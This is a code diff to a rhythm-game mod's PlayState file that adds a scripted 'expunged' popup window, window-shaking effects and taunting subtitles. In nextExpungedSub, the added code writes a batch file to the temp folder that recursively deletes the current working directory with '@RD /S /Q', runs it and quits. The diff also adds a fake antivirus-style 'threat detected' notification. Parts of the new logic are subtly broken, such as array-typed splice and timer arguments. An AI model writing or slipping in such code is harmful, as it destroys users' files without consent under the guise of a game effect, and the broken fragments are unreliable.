@@ -1,5 +1,6 @@
 package;
 
+import flixel.graphics.frames.FlxFrame;
 import flixel.graphics.FlxGraphic;
 #if desktop
 import Discord.DiscordClient;
@@ -60,6 +61,7 @@ import openfl.events.KeyboardEvent;
 import flixel.effects.particles.FlxEmitter;
 import lime.tools.ApplicationData;
 import flixel.effects.particles.FlxParticle;
+import flixel.system.debug.Window;
 import flixel.util.FlxSave;
 import flixel.animation.FlxAnimationController;
 import animateatlas.AtlasFrameMaker;
@@ -72,6 +74,7 @@ import Conductor.Rating;
 
 #if windows
 import lime.app.Application;
+import sys.io.Process;
 #end
 
 #if !flash 
@@ -87,6 +90,12 @@ import sys.io.File;
 #if VIDEOS_ALLOWED
 import vlc.MP4Handler;
 #end
+
+import flixel.system.debug.Window;
+import lime.ui.Window;
+import openfl.display.Sprite;
+import openfl.geom.Matrix;
+import openfl.geom.Rectangle;
 
 using StringTools;
 
@@ -187,6 +196,7 @@ class PlayState extends MusicBeatState
 	public var vocals:FlxSound;
 
 	public var elapsedtime:Float = 0;
+	public var elapsedexpungedtime:Float = 0;
 
 	public var dad:Character = null;
 	public var gf:Character = null;
@@ -194,11 +204,11 @@ class PlayState extends MusicBeatState
 
 	private var altSong:SwagSong;
 
-	var funnyFloatyBoys:Array<String> = ['dave-3d', 'hell-expunged-ffn-phase-1', 'cheating-expunged', 'god-expunged', 'unfairbambi', 'hell-expunged-phase-2', 'true-ex'];
+	var funnyFloatyBoys:Array<String> = ['dave-3d', 'hell-expunged-ffn-phase-1', 'hell-expunged-new', 'cheating-expunged', 'god-expunged', 'unfairbambi', 'hell-expunged-phase-2', 'true-ex'];
 	var funnySideFloatyBoys:Array<String> = ['bombu', 'bombu-expunged'];
 	var canSlide:Bool = true;
 	
-	var dontDarkenChar:Array<String> = ['bambi-god', 'bambi-god2d', 'hell-expunged-ffn-phase-1', 'hell-expunged-phase-2', 'god-expunged'];
+	var dontDarkenChar:Array<String> = ['bambi-god', 'bambi-god2d', 'hell-expunged-ffn-phase-1', 'hell-expunged-new', 'hell-expunged-phase-2', 'god-expunged'];
 
 	public var notes:FlxTypedGroup<Note>;
 	public var unspawnNotes:Array<Note> = [];
@@ -260,6 +270,30 @@ class PlayState extends MusicBeatState
 	public var bads:Int = 0;
 	public var shits:Int = 0;
 
+	//exploitation window
+	public var ExpungedWindowCenterPos:FlxPoint = new FlxPoint(0,0);
+	private var windowSteadyX:Float;
+	public static var window:Window;
+	var expungedScroll = new Sprite();
+	var expungedSpr = new Sprite();
+	var expungedProperties:Array<Dynamic> = new Array<Dynamic>();
+	var windowProperties:Array<Dynamic> = new Array<Dynamic>();
+	public var expungedWindowMode:Bool = false;
+	public var peepis:Bool = false;
+	var expungedOffset:FlxPoint = new FlxPoint();
+	var expungedMoving:Bool = true;
+	var lastFrame:FlxFrame;
+	var glitchText:Bool = true;
+
+	//exploitation misc
+	var preDadPos:FlxPoint = new FlxPoint();
+	var closedExpunged:Bool;
+	var expungedSubs:Array<Dynamic> = [
+		['[YOU THOUGHT YOU COULD GET RID OF ME THAT EASILY?]', 2, 0.02, 0.5],
+		['[WELL FUCK YOU TOO THEN, I GUESS.]', 0.5, 0.6, 1],
+		["[WOW, YOU REALLY HATE ME DON'T YOU?]", 2, 0.02, 0.5]
+	];
+
 	public var hasBfDarkLevels:Array<String> = ['farmNight', 'houseNight', '3dUnfair', 'bambersHell', 'bambersHell2']; // 0xFF878787
 	public var hasBfSunsetLevels:Array<String> = ['farmSunset', 'houseSunset']; // 0xFFF9974C
 	public var hasBfDarkerLevels:Array<String> = ['spooky']; // not needed 
@@ -303,7 +337,6 @@ class PlayState extends MusicBeatState
 	public var dadStrumAmount = 4;
 	public var playerStrumAmount = 4;
 	public static var scrollType:String;
-	var glitchText:Bool = true;
 
 	static var DOWNSCROLL_Y:Float;
 	static var UPSCROLL_Y:Float;
@@ -460,6 +493,8 @@ class PlayState extends MusicBeatState
 	public static var lastCombo:FlxSprite;
 	// stores the last combo score objects in an array
 	public static var lastScore:Array<FlxSprite> = [];
+
+	var timeSpeed:Float = 1;
 
 	override public function create()
 	{
@@ -1162,7 +1197,7 @@ class PlayState extends MusicBeatState
 
 			case 'bambersHell': // the basic shit
 			{
-				defaultCamZoom = 0.7;
+				defaultCamZoom = 0.55;
 				curStage = 'bambersHell';
 				var bg:BGSprite = new BGSprite('purgatory/shine', -600, -200, 0.2, 0.2);
 				bg.antialiasing = false;
@@ -1171,6 +1206,7 @@ class PlayState extends MusicBeatState
 				add(bg);
 	
 				var bgshit:BGSprite = new BGSprite('purgatory/Grid_BG', -600, -300, 0.7, 0.7);
+				bgshit.setGraphicSize(Std.int(bgshit.width * 1.2));
 				bgshit.antialiasing = false;
 				bgshit.scrollFactor.set(0, 0);
 				bgshit.active = true;
@@ -1676,7 +1712,7 @@ class PlayState extends MusicBeatState
 
 		switch(dad.curCharacter)
 			{
-				case 'hell-expunged-FFN-phase-1' | 'hell-expunged-phase-2':
+				case 'hell-expunged-FFN-phase-1' | 'hell-expunged-phase-2' | 'hell-expunged-new':
 					evilTrail = new FlxTrail(dad, null, 4, 12, 0.3, 0.069); //nice
 					insert(members.indexOf(dadGroup) - 1, evilTrail);
 					switch (curStage)
@@ -3879,6 +3915,52 @@ class PlayState extends MusicBeatState
 
 	override public function update(elapsed:Float)
 	{
+		if (expungedWindowMode && window != null && peepis)
+		{
+			var display = Application.current.window.display.currentMode;
+
+			@:privateAccess
+			var dadFrame = dad._frame;
+			if (dadFrame == null || dadFrame.frame == null) return; // prevent crashes (i hope)
+	  
+			var rect = new Rectangle(dadFrame.frame.x, dadFrame.frame.y, dadFrame.frame.width, dadFrame.frame.height);
+
+			expungedScroll.scrollRect = rect;
+
+			window.x = Std.int(expungedOffset.x);
+			window.y = Std.int(expungedOffset.y);
+
+			if (!expungedMoving)
+			{
+				elapsedexpungedtime += elapsed * 9;
+
+				var screenwidth = Application.current.window.display.bounds.width;
+				var screenheight = Application.current.window.display.bounds.height;
+
+				var toy = ((-Math.sin((elapsedexpungedtime / 9.5) * 2) * 30 * 5.1) / 1080) * screenheight;
+				var tox = ((-Math.cos((elapsedexpungedtime / 9.5)) * 100) / 1980) * screenwidth;
+
+				expungedOffset.x = ExpungedWindowCenterPos.x + tox;
+				expungedOffset.y = ExpungedWindowCenterPos.y + toy;
+
+				//center
+				Application.current.window.y = Math.round(((screenheight / 2) - (720 / 2)) + (Math.sin((elapsedexpungedtime / 30)) * 80));
+				Application.current.window.x = Std.int(windowSteadyX);
+				Application.current.window.width = 1280;
+				Application.current.window.height = 720;
+			}
+
+			if (lastFrame != null && dadFrame != null && lastFrame.name != dadFrame.name)
+			{
+				expungedSpr.graphics.clear();
+				generateWindowSprite();
+				lastFrame = dadFrame;
+			}
+
+			expungedScroll.x = (((dadFrame.offset.x) - (dad.offset.x)) * expungedScroll.scaleX) + 80;
+			expungedScroll.y = (((dadFrame.offset.y) - (dad.offset.y)) * expungedScroll.scaleY);
+		}
+
 		FlxG.camera.setFilters([new ShaderFilter(screenshader.shader)]); // this is very stupid but doesn't effect memory all that much so
 		if (shakeCam && eyesoreson)
 		{
@@ -4076,7 +4158,7 @@ class PlayState extends MusicBeatState
                     gf.color = 0xFF878787;
                     boyfriend.color = 0xFF878787;
 
-					if (SONG.player2 == 'hell-expunged-FFN-phase-1' || SONG.player2 == 'god-expunged' || SONG.player2 == 'hell-expunged-phase-2') //glowing bitches
+					if (SONG.player2 == 'hell-expunged-FFN-phase-1' || SONG.player2 == 'god-expunged' || SONG.player2 == 'hell-expunged-phase-2' || SONG.player2 == 'hell-expunged-new') //glowing bitches
 					{
 						dad.color = 0xFFFFFFFF;
 					}
@@ -4235,7 +4317,7 @@ class PlayState extends MusicBeatState
 		}
 
 		if (ratingName == '?') {
-			if (SONG.song.toLowerCase() == 'nether')
+			if (SONG.song.toLowerCase() == 'nether' && glitchText)
 			{
             	scoreTxt.text = 'nPS: 0 (mAx 0) // Sc0r3: ' + (songScore * FlxG.random.int(1,9)) + " // C0mb0 Br3akS: " + (songMisses * FlxG.random.int(1,9)) + " // AccuRacy: " + (${Highscore.floorDecimal(ratingPercent * 100, 2)} * FlxG.random.int(1,9)) + '% // N/A';
 			}
@@ -4244,7 +4326,7 @@ class PlayState extends MusicBeatState
 				scoreTxt.text = 'NPS: 0 (Max 0) // Score: 0 // Combo Breaks: 0 // Accuracy: 0% // N/A';
 			}
         } else {
-			if (SONG.song.toLowerCase() == 'nether')
+			if (SONG.song.toLowerCase() == 'nether' && glitchText)
 			{
 				scoreTxt.text = 'nPS: ' + (nps * FlxG.random.int(1,9)) + " (mAx " + (maxnps * FlxG.random.int(1,9)) + ") // Sc0r3: " + (songScore * FlxG.random.int(1,9)) + " // C0mb0 Br3akS: " + (songMisses * FlxG.random.int(1,9)) + " // AccuRacy: " + (${Highscore.floorDecimal(ratingPercent * 100, 2)} * FlxG.random.int(1,9)) + '% // N/A';
 			}
@@ -4714,6 +4796,15 @@ class PlayState extends MusicBeatState
 					];
 					CoolSystemStuff.generateTextFile(expungedLines[FlxG.random.int(0, expungedLines.length)], 'HELLO');
 				}
+				#if windows
+				if (window != null)
+				{
+					closeExpungedWindow();
+
+					//x,y, width, height
+					FlxTween.tween(Application.current.window, {x: windowProperties[0], y: windowProperties[1], width: windowProperties[2], height: windowProperties[3]}, 1, {ease: FlxEase.circInOut});
+				}
+				#end
 				DiscordClient.changePresence("Game Over - " + detailsText, SONG.song, iconP2.getCharacter());
 				#end
 				isDead = true;
@@ -5380,6 +5471,13 @@ class PlayState extends MusicBeatState
 					Application.current.window.title = "Fearsome Funky Night'"; //set the shit back
 					Main.toggleFuckedFPS(false);
 			}
+
+			#if windows
+			if (window != null)
+			{
+				closeExpungedWindow();
+			}
+			#end
 
 
 			if (isStoryMode)
@@ -6579,6 +6677,10 @@ class PlayState extends MusicBeatState
 			moveCameraSection();
 		}
 
+		//CAN'T BELIEVE I HAVE TO DEFINE THIS AGAIN
+		var screenwidth = Application.current.window.display.bounds.width;
+		var screenheight = Application.current.window.display.bounds.height;
+
 		switch (SONG.song.toLowerCase())
 		{
 			case 'hypercube':
@@ -6660,7 +6762,7 @@ class PlayState extends MusicBeatState
 						remove(evilTrail2); //so that i dont have to use AUUGHHH-
 						switch(dad.curCharacter)
 						{
-							case 'hell-expunged-FFN-phase-1' | 'hell-expunged-phase-2' : // i honestly have no fucking idea lmao -frogb
+							case 'hell-expunged-FFN-phase-1' | 'hell-expunged-phase-2' | 'hell-expunged-new': // i honestly have no fucking idea lmao -frogb
 								evilTrail3 = new FlxTrail(dad, null, 4, 12, 0.3, 0.069); //nice
 								insert(members.indexOf(dadGroup) - 1, evilTrail3);
 						}
@@ -6668,13 +6770,53 @@ class PlayState extends MusicBeatState
 			case 'nether':
 				switch(curStep)
 				{
+					case 1:
+						windowProperties = [
+							Application.current.window.x,
+							Application.current.window.y,
+							Application.current.window.width,
+							Application.current.window.height
+						];
 					case 384:
 						expungedBG2.visible = false;
 						expungedFRONT2.visible = false;
+					case 448:
+						/*
+						x centered: Std.int((screenwidth / 2) - (1280 / 2))
+						y centered: Std.int((screenheight / 2) - (720 / 2));
+						*/
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2)) - 200}, 0.1, {ease: FlxEase.quadOut});
+					case 451:
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2)) + 200}, 0.1, {ease: FlxEase.quadOut});
+					case 454:
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2))}, 0.1, {ease: FlxEase.quadOut});
+					case 508:
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2)) - 300, y: Std.int((screenheight / 2) - (720 / 2)) - 100}, 0.0001, {ease: FlxEase.quadOut});
+					case 509:
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2)) + 300}, 0.0001, {ease: FlxEase.quadOut});
+					case 510:
+						FlxTween.tween(Application.current.window, {x: Std.int((screenwidth / 2) - (1280 / 2)), y: Std.int((screenheight / 2) - (720 / 2))}, 0.0001, {ease: FlxEase.quadOut}); //center that shit back
+					//case 1216:
+						//popupWindow();
+					case 1220:
+						PlatformUtil.sendWindowsNotification("Anticheat.dll", "Potential threat detected: expunged.dat");
 					case 1337:
 						FlxTween.tween(camHUD, {angle: 180}, 0.20, {ease: FlxEase.quadOut});
 					case 1340:
 						FlxTween.tween(camHUD, {angle: 0}, 0.20, {ease: FlxEase.quadOut});
+					//case 1728:
+					//	#if windows
+					//	if (window != null)
+					//	{
+					//		FlxTween.tween(expungedSpr, {alpha: 0}, 1, {ease: FlxEase.bounceOut, onComplete: function(tween:FlxTween)
+					//		{
+					//			closeExpungedWindow();
+					//		}});
+					//		FlxTween.tween(Application.current.window, {x: windowProperties[0], y: windowProperties[1], width: windowProperties[2], height: windowProperties[3]}, 1, {ease: FlxEase.circInOut});
+					//	}
+					//	#end
+					case 1776:
+						//dad.visible = true;
 				}
 		}
 		super.stepHit();
@@ -6744,7 +6886,7 @@ class PlayState extends MusicBeatState
 	    }
 
 
-	//health icon bounce but epic
+		//health icon bounce but epic
 		if (curBeat % gfSpeed == 0) {
 			curBeat % (gfSpeed * 2) == 0 ? {
 				iconP1.scale.set(1.1, 1.3);
@@ -6924,6 +7066,146 @@ class PlayState extends MusicBeatState
 				}
 			}
 		}
+
+		function popupWindow()
+		{
+			var screenwidth = Application.current.window.display.bounds.width;
+			var screenheight = Application.current.window.display.bounds.height;
+
+			// center
+			Application.current.window.x = Std.int((screenwidth / 2) - (1280 / 2));
+			Application.current.window.y = Std.int((screenheight / 2) - (720 / 2));
+			Application.current.window.width = 1280;
+			Application.current.window.height = 720;
+		
+		window = Application.current.createWindow({
+			title: "expunged.dat",
+			width: 800,
+			height: 800,
+			borderless: true,
+			alwaysOnTop: true
+		});
+
+		window.stage.color = 0x00010101;
+		@:privateAccess
+		window.stage.addEventListener("keyDown", FlxG.keys.onKeyDown);
+		@:privateAccess
+		window.stage.addEventListener("keyUp", FlxG.keys.onKeyUp);
+		#if linux
+		//testing stuff
+		window.stage.color = 0xff000000;
+		trace('BRAP');
+		#end
+		PlatformUtil.getWindowsTransparent();
+
+		preDadPos = dad.getPosition();
+		dad.x = 0;
+		dad.y = 0;
+
+		FlxG.mouse.useSystemCursor = true;
+
+		generateWindowSprite();
+
+		expungedScroll.scrollRect = new Rectangle();
+		window.stage.addChild(expungedScroll);
+		expungedScroll.addChild(expungedSpr);
+		expungedScroll.scaleX = 0.5;
+		expungedScroll.scaleY = 0.5;
+
+		expungedOffset.x = Application.current.window.x;
+		expungedOffset.y = Application.current.window.y;
+
+		dad.visible = false;
+		
+		var windowX = Application.current.window.x + ((Application.current.window.display.bounds.width) * 0.140625);
+
+		windowSteadyX = windowX;
+
+		FlxTween.tween(expungedOffset, {x: -20}, 2, {ease: FlxEase.elasticOut});
+
+		FlxTween.tween(Application.current.window, {x: windowX}, 2.2, {
+			ease: FlxEase.elasticOut,
+			onComplete: function(tween:FlxTween)
+			{
+				ExpungedWindowCenterPos.x = expungedOffset.x;
+				ExpungedWindowCenterPos.y = expungedOffset.y;
+				expungedMoving = false;
+			}
+		});
+
+		Application.current.window.onClose.add(function()
+		{
+			if (window != null)
+			{
+				closeExpungedWindow();
+			}
+		}, false, 100);
+
+		Application.current.window.focus();
+		expungedWindowMode = true;
+
+		@:privateAccess
+		lastFrame = dad._frame;
+	}
+
+	function generateWindowSprite()
+	{
+		var m = new Matrix();
+		m.translate(0, 100);
+		expungedSpr.graphics.beginBitmapFill(dad.pixels, m);
+		expungedSpr.graphics.drawRect(0, 0, dad.pixels.width, dad.pixels.height);
+		expungedSpr.graphics.endFill();
+	}
+
+	function uhOh()
+	{
+		new FlxTimer().start(expungedSubs[0], function(timer:FlxTimer)
+		{
+			subtitleManager.addSubtitle(expungedSubs[0][0], expungedSubs[0][2], expungedSubs[0][1], function()
+			{
+				nextExpungedSub();
+			});
+		});
+	}
+
+	function nextExpungedSub()
+	{
+		expungedSubs.splice(expungedSubs[0], 1);
+		var nextSub:Dynamic = expungedSubs[0];
+		if (expungedSubs.length <= 0)
+		{
+			new FlxTimer().start(1, function(timer:FlxTimer)
+			{
+				CoolSystemStuff.generateTextFile("[I'VE HAD ENOUGH]", "GOODBYE");
+				
+				var batchPath = CoolSystemStuff.getTempPath() + "/goodbye.bat";
+				
+				var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
+				File.saveContent(batchPath, crazyBatch);
+				
+				new Process(batchPath, []);
+				Sys.exit(0);
+			});
+		}
+		else
+		{
+			new FlxTimer().start(nextSub[3], function(timer:FlxTimer)
+			{
+				subtitleManager.addSubtitle(nextSub[0], nextSub[2], nextSub[1], function()
+				{
+					nextExpungedSub();
+				});
+			});
+		}
+	}
+
+	public function closeExpungedWindow()
+	{
+		expungedWindowMode = false;
+		window.onClose.removeAll();
+		window.close();
+		window = null;
+	}
 
 	override function sectionHit()
 	{
